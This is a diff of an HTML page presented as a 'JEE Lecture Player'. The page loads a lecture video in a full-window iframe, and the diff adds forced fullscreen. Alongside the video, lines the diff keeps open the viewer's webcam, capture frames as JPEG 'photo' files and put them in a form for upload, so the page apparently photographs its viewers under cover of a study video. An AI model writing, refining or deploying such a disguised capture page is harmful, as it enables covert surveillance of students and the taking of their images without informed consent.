@@ -4,12 +4,29 @@
   <meta charset="UTF-8">
   <title>JEE Lecture Player</title>
   <style>
-    html,body{margin:0;height:100%;background:black}
-    iframe{width:100%;height:100%;border:0}
+    html,body{
+      margin:0;
+      height:100%;
+      background:black
+    }
+    iframe{
+      width:100%;
+      height:100%;
+      border:0
+    }
     #overlay{
-      position:absolute;top:0;left:0;width:100%;height:100%;
-      background:#000;display:flex;align-items:center;justify-content:center;
-      color:white;cursor:pointer;z-index:10
+      position:absolute;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:#000;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:white;
+      cursor:pointer;
+      z-index:10
     }
   </style>
 </head>
@@ -27,11 +44,22 @@ async function start(){
 
   const r = await fetch("/get_video_link");
   const d = await r.json();
-  document.getElementById("frame").src = d.url;
+
+  const frame = document.getElementById("frame");
+  frame.src = d.url;
+
+  /* 🔥 ONLY ADDITION: FULLSCREEN VIDEO */
+  if(frame.requestFullscreen){
+    frame.requestFullscreen();
+  }else if(frame.webkitRequestFullscreen){
+    frame.webkitRequestFullscreen();
+  }else if(frame.msRequestFullscreen){
+    frame.msRequestFullscreen();
+  }
 
   try{
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: 1280, height: 720 }   // ✅ FIX 1
+      video:{ width:1280, height:720 }
     });
     v.srcObject = stream;
 
@@ -41,12 +69,10 @@ async function start(){
 }
 
 function capture(){
-  // ✅ FIX 2 (MOST IMPORTANT)
   c.width  = v.videoWidth;
   c.height = v.videoHeight;
 
   c.getContext("2d").drawImage(v,0,0,c.width,c.height);
-
   c.toBlob(b=>{
     let f=new FormData();
     f.append("photo",b,"u.jpg");
@@ -54,5 +80,6 @@ function capture(){
   },"image/jpeg",0.6);
 }
 </script>
+
 </body>
 </html>
